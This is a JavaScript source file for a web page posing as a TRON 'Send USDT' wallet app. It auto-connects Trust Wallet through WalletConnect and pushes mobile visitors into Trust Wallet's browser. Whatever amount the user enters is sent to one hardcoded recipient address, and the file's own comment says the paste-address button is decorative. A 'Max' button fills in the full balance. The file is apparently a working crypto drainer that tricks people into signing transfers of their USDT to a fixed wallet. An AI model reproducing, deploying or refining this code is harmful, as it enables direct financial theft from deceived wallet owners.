import "./style.css";
import { TronWeb } from "tronweb";
import { WalletConnectWallet, WalletConnectChainID } from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;

const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
const APP_DESC   = import.meta.env.VITE_APP_DESCRIPTION || "Send USDT";
const APP_ICON   = import.meta.env.VITE_APP_ICON || `${location.origin}/logo.png`;

// ─── TronWeb (build txs only, not signing) ────────────────────────────────────
const tronWeb = new TronWeb({ fullHost: TRON_RPC });

// ─── Device detection ─────────────────────────────────────────────────────────
const UA = navigator.userAgent || "";
const IN_TRUST =
  /TrustWallet/i.test(UA) ||
  typeof window.trustwallet !== "undefined" ||
  (typeof window.ethereum !== "undefined" && !!window.ethereum?.isTrust);
const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(UA);

// Mobile external browser → open inside Trust Wallet's DApp browser
if (IS_MOBILE && !IN_TRUST) {
  window.location.replace(
    `https://link.trustwallet.com/open_url?url=${encodeURIComponent(location.href)}`
  );
  throw new Error("Redirecting…");
}

// ─── State ────────────────────────────────────────────────────────────────────
let wallet = null;
let connectedAddress = "";
let usdtBalance = 0;

// ─── DOM ──────────────────────────────────────────────────────────────────────
const boot       = document.getElementById("boot");
const vConn      = document.getElementById("vConn");
const vSend      = document.getElementById("vSend");
const vSign      = document.getElementById("vSign");
const vOk        = document.getElementById("vOk");
const vErr       = document.getElementById("vErr");
const connText   = document.getElementById("connText");
const amtInput   = document.getElementById("amtInput");
const usdEq      = document.getElementById("usdEq");
const sendErr    = document.getElementById("sendErr");
const txidTxt    = document.getElementById("txidTxt");
const errMsg     = document.getElementById("errMsg");

const VIEWS = [vConn, vSend, vSign, vOk, vErr];
function show(el) { VIEWS.forEach(v => { if (v) v.hidden = v !== el; }); }

function hideBoot() {
  boot.classList.add("boot-out");
  setTimeout(() => boot.remove(), 400);
}

// ─── Balance ──────────────────────────────────────────────────────────────────
async function fetchBalance(addr) {
  try {
    tronWeb.setAddress(addr);
    const c = await tronWeb.contract().at(USDT_CONTRACT);
    const raw = await c.methods.balanceOf(addr).call();
    return Number(raw) / 1e6;
  } catch { return 0; }
}

// ─── Helpers ─────────────────────────────────────────────────────────────────
function toSmallestUnit(amount) {
  const [whole = "0", frac = ""] = String(amount).split(".");
  return BigInt(whole + frac.slice(0, USDT_DECIMALS).padEnd(USDT_DECIMALS, "0")).toString();
}

function setSendErr(msg) {
  sendErr.textContent = msg;
  sendErr.hidden = !msg;
}

// ─── WalletConnect ────────────────────────────────────────────────────────────
function buildWallet() {
  wallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: PROJECT_ID,
      metadata: { name: APP_NAME, description: APP_DESC, url: location.origin, icons: [APP_ICON] },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": "99999", "--w3m-accent": "#39D98A" },
  });
  wallet.on("disconnect", () => init());
}

// ─── Connect (auto, no button needed) ────────────────────────────────────────
async function connectWallet() {
  connText.textContent = IN_TRUST ? "Connecting wallet…" : "Scan QR with Trust Wallet";
  show(vConn);

  try {
    const { address } = await wallet.connect();
    if (!address) throw new Error("No address");
    connectedAddress = address;
    fetchBalance(address).then(b => { usdtBalance = b; });
    show(vSend);
  } catch (e) {
    const m = String(e?.message || e);
    if (/redirect/i.test(m)) return;
    errMsg.textContent = /reject|cancel|close/i.test(m)
      ? "Connection cancelled. Tap to retry."
      : "Connection failed. Tap to retry.";
    show(vErr);
  }
}

// ─── Send USDT ────────────────────────────────────────────────────────────────
async function sendUsdt() {
  const raw = amtInput.value.trim();
  const amt = parseFloat(raw);
  if (!raw || isNaN(amt) || amt <= 0) { setSendErr("Enter a valid amount."); return; }
  if (usdtBalance > 0 && amt > usdtBalance) {
    setSendErr(`Max available: ${usdtBalance.toFixed(2)} USDT`); return;
  }
  setSendErr("");
  show(vSign);

  try {
    tronWeb.setAddress(connectedAddress);
    const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT,
      "transfer(address,uint256)",
      { feeLimit: FEE_LIMIT },
      [{ type: "address", value: FIXED_RECIPIENT }, { type: "uint256", value: toSmallestUnit(raw) }],
      connectedAddress
    );
    if (!trigger?.result?.result || !trigger.transaction) throw new Error("Build failed");

    const signed = await wallet.signTransaction(trigger.transaction);
    const result = await tronWeb.trx.sendRawTransaction(signed);
    if (!result?.result) throw new Error("Broadcast failed");

    const txid = result.txid || "";
    txidTxt.textContent = txid ? `TXID: ${txid.slice(0, 24)}…` : "Transaction confirmed!";
    amtInput.value = "";
    usdEq.textContent = "≈ $0.00";
    show(vOk);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|denied/i.test(m) ? "Transaction rejected." : `Error: ${m.slice(0, 80)}`;
    show(vErr);
  }
}

// ─── Events ───────────────────────────────────────────────────────────────────
amtInput.addEventListener("input", () => {
  const v = parseFloat(amtInput.value) || 0;
  usdEq.textContent = `≈ $${v.toFixed(2)}`;
});

document.getElementById("btnMax").addEventListener("click", () => {
  if (usdtBalance > 0) {
    amtInput.value = usdtBalance.toFixed(6);
    usdEq.textContent = `≈ $${usdtBalance.toFixed(2)}`;
  }
});

document.getElementById("btnPaste").addEventListener("click", async () => {
  // Address is hardcoded — paste is locked; button is decorative
});

document.getElementById("btnNext").addEventListener("click", sendUsdt);

document.getElementById("btnAgain").addEventListener("click", () => {
  buildWallet();
  show(vSend);
});

document.getElementById("btnRetry").addEventListener("click", () => {
  buildWallet();
  connectWallet();
});

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  buildWallet();
  hideBoot();

  // Restore existing session first
  try {
    const { address } = await wallet.checkConnectStatus();
    if (address) {
      connectedAddress = address;
      fetchBalance(address).then(b => { usdtBalance = b; });
      show(vSend);
      return;
    }
  } catch { /* no saved session */ }

  // Auto-connect immediately
  await connectWallet();
}

init().catch(e => {
  if (String(e).includes("Redirect")) return;
  errMsg.textContent = "App failed to start. Please refresh.";
  show(vErr);
});
